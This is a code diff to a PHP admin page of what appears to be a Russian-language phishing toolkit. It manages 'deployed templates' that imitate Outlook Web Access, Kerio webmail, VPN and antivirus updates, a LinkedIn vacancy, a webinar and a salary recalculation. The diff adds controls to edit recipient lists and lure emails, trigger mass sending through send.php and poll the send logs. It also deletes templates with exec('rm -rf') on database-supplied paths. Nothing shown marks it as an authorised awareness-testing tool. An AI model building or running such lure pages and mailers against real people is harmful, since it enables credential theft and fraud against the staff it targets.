@@ -1,3 +1,8 @@
+<?php
+header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+header("Cache-Control: post-check=0, pre-check=0", false);
+header("Pragma: no-cache");
+?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -128,7 +133,7 @@
                                 <i class="fa fa-dashboard"></i>  <a href="../">Статистика</a>
                             </li>
                             <li class="active">
-                                <i class="fa fa-flag"></i> USB</a>
+                                <i class="fa fa-flag"></i> Развернутые шаблоны</a>
                             </li>
                         </ol>
          
@@ -140,10 +145,12 @@
 
                         <div class="table-responsive">
                            <div class="footer"></div>
-                            <h3>Удалить развернутые шаблоны</h3>
+                            <h3>Развернутые шаблоны</h3>
                                 <?php
                 include('../bd.php');
                 mysqli_set_charset($link, "utf8");
+
+
 
                 if($_POST['attack'] == "Outlook"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Outlook' ");
@@ -167,7 +174,7 @@
                     }
                 }
 
-                if($_POST['attack'] == "Проверка пароля"){
+                if($_POST['attack'] == "checkpass"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Проверка пароля' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
                         $dir = $row[1];
@@ -178,7 +185,7 @@
                     }
                 }
 
-                if($_POST['attack'] == "Вебинар"){
+                if($_POST['attack'] == "webinar"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Вебинар' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
                         $dir = $row[1];
@@ -189,7 +196,7 @@
                     }
                 }
 
-                if($_POST['attack'] == "Обновление VPN"){
+                if($_POST['attack'] == "vpn"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Обновление VPN' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
                         $dir = $row[1];
@@ -200,8 +207,19 @@
                     }
                 }
 
+                if($_POST['attack'] == "LinkedIn"){
+                    $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'LinkedIn' ");
+                    while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
+                        $dir = $row[1];
+                        $delete_template = $dir.'/vacancy';
+                        exec ("rm -rf $delete_template");
+                        mysqli_query($link,"DELETE FROM deployed WHERE attack_name = 'LinkedIn' ");
+                        mysqli_query($link,"DELETE FROM attacks_stats WHERE attack_name = 'LinkedIn' ");
+                    }
+                }
 
-                if($_POST['attack'] == "Установка антивируса"){
+
+                if($_POST['attack'] == "antivirus"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Установка антивируса' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
                         $dir = $row[1];
@@ -212,18 +230,7 @@
                     }
                 }
 
-                if($_POST['attack'] == "Премия"){
-                    $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Премия' ");
-                    while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
-                        $dir = $row[1];
-                        $delete_template = $dir.'/premia';
-                        exec ("rm -rf $delete_template");
-                        mysqli_query($link,"DELETE FROM deployed WHERE attack_name = 'Премия' ");
-                        mysqli_query($link,"DELETE FROM attacks_stats WHERE attack_name = 'Премия' ");
-                    }
-                }
-
-                if($_POST['attack'] == "Перерасчет ЗП"){
+                if($_POST['attack'] == "pereraschet"){
                     $query = mysqli_query($link,"SELECT * FROM deployed WHERE attack_name = 'Перерасчет ЗП' ");
                     while($row = mysqli_fetch_array($query,MYSQLI_NUM)){
                         $dir = $row[1];
@@ -240,16 +247,25 @@
                     $dir = $row[1];
                     echo '<div class="col-lg-1 text-center" style="border:1px solid #ccc;width:400px;margin:0 30px 30px 0;padding:30px ">';
                     
-                    if($attack_name == "Kerio"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/webmail/login/index.php' target='_blank''>Перейти к шаблону $attack_name</p>";}
-                    if($attack_name == "Outlook"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/owa' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Проверка пароля"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/check/' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Вебинар"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/event/' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Обновление VPN"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/openvpn/' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Установка антивируса"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/avast/' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Перерасчет ЗП"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/pereraschet/' target='_blank'>$attack_name</p>";}
-                    if($attack_name == "Премия"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/premia/' target='_blank'>$attack_name</p>";}
-                    echo '
-                                <form action="deployed.php" method="POST">
+                    if($attack_name == "Kerio"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/webmail/login/index.php' target='_blank''>Перейти к шаблону $attack_name</a></p>";}
+                    if($attack_name == "Outlook"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/owa' target='_blank'>$attack_name</a></p>";}
+                    if($attack_name == "Проверка пароля"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/check/' target='_blank'>$attack_name</a></p>";$attack_name = "checkpass";}
+                    if($attack_name == "Вебинар"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/event/' target='_blank'>$attack_name</a></p>";$attack_name = "webinar";}
+                    if($attack_name == "Обновление VPN"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/openvpn/' target='_blank'>$attack_name</a></p>";;$attack_name = "vpn";}
+                    if($attack_name == "LinkedIn"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/vacancy/' target='_blank'>$attack_name</a></p>";$attack_name = "LinkedIn";}
+                    if($attack_name == "Установка антивируса"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/avast/' target='_blank'>$attack_name</a></p>";$attack_name = "antivirus";}
+                    if($attack_name == "Перерасчет ЗП"){echo "<p><a href='https://$_SERVER[HTTP_HOST]/pereraschet/' target='_blank'>$attack_name</a></p>";$attack_name = "pereraschet";}
+                    echo ' 
+                            <a href="edit.php?template='.$attack_name.'_sendlist"><button class="btn btn-default">sendlist.txt</button></a>
+                            <a href="edit.php?template='.$attack_name.'_user"><button class="btn btn-default">user.txt</button></a><br>
+                            <a href="edit.php?template='.$attack_name.'"><button class="btn btn-default">Изменить письмо</button></a><br>
+                            <button id="but_'.$attack_name.'" value="'.$attack_name.'" class="btn btn-default" name="but1">Отправить</button>
+                            <br><br>
+                            <span style="color:green;">Отправленные письма:</span><br>
+                            <span style="color:grey;">дата &nbsp;| &nbsp; время &nbsp; | &nbsp; id &nbsp; | &nbsp; email </span>
+                            <div id="log_'.$attack_name.'"></div>
+                            <br>
+                            <form action="deployed.php" method="POST">
                                     <input class="btn btn-default" type="submit" id="submit-btn" name="delete" value="Удалить">
                                     <input type="hidden" name="attack" value="'.$attack_name.'"> 
                                 </form>
@@ -278,6 +294,75 @@
 
     <!-- jQuery -->
     <script src="../js/jquery.js"></script>
+
+<script type="text/javascript">
+    $("#but_Outlook, #but_Kerio, #but_Outlook, #but_checkpass, #but_webinar, #but_vpn, #but_antivirus, #but_LinkedIn, #but_pereraschet").click(function(e) {
+        e.preventDefault();
+        $.ajax({
+            type: "POST",
+            url: "send.php",
+            data: { 
+                send: $(this).val()
+            },
+        });
+    });
+
+</script>
+
+<script>
+$(document).ready(function(){
+      refreshOutlook(),
+      refreshPereraschet(),
+      refreshKerio(),
+      refreshCheckpass(),
+      refreshWebinar(),
+      refreshVpn(),
+      refreshaAntivirus(),
+      refreshaLinkedIn();
+    });
+
+    function refreshOutlook(){
+        $("#log_Outlook").load("../../../owa/auth/sender/send_log.txt", function(){
+           setTimeout(refreshOutlook, 2000);
+        });
+    }
+    function refreshPereraschet(){
+        $("#log_pereraschet").load("../../../pereraschet/sender/send_log.txt", function(){
+           setTimeout(refreshPereraschet, 2000);
+        });
+    }
+    function refreshKerio(){
+        $("#log_Kerio").load("../../../webmail/login/sender/send_log.txt", function(){
+           setTimeout(refreshKerio, 2000);
+        });
+    }
+    function refreshCheckpass(){
+        $("#log_checkpass").load("../../../check/sender/send_log.txt", function(){
+           setTimeout(refreshCheckpass, 2000);
+        });
+    }
+    function refreshWebinar(){
+        $("#log_webinar").load("../../../event/6f3249aa304055d6/sender/send_log.txt", function(){
+           setTimeout(refreshWebinar, 2000);
+        });
+    }
+    function refreshVpn(){
+        $("#log_vpn").load("../../../openvpn/sender/send_log.txt", function(){
+           setTimeout(refreshVpn, 2000);
+        });
+    }
+    function refreshaAntivirus(){
+        $("#log_Antivirus").load("../../../avast/sender/send_log.txt", function(){
+           setTimeout(refreshaAntivirus, 2000);
+        });
+    }
+    function refreshaLinkedIn(){
+        $("#log_LinkedIn").load("../../../vacancy/sender/send_log.txt", function(){
+           setTimeout(refreshaLinkedIn, 2000);
+        });
+    }
+
+</script>
 
     <!-- Bootstrap Core JavaScript -->
     <script src="../js/bootstrap.min.js"></script>
